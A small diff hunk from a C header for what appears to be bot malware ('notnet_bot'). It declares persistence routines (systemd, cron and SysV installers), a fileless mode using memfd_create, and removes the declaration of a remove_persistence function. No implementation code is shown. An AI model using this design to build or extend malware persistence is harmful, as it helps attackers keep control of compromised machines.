@@ -20,7 +20,6 @@ int persist_install(notnet_bot_t *bot);
  * executable exists; no-op when persistence is enabled, when already
  * running fileless, or on platforms without memfd_create. */
 int persist_become_fileless(notnet_bot_t *bot);
-int remove_persistence(void);
 int install_systemd(const char *bin_path);
 int install_cron(const char *bin_path);
 int install_sysv(const char *bin_path);
